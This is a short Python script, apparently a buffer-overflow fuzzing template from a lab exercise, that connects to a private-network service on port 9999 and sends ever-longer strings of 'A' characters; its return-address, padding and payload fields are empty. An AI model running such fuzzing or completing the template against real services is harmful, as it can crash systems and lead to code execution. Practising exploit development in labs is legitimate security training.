import socket
import os
import time

ip = "192.168.56.103"
port = 9999

prefix = ""
offset = 900
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  while(True):
    s.connect((ip, port))
    print("fuzzing with {} bytes".format(len(buffer)))
    s.send(bytes(buffer + "\n", "latin-1"))
    buffer += "A"*100
    time.sleep(1)
except:
  print("Could not connect.")
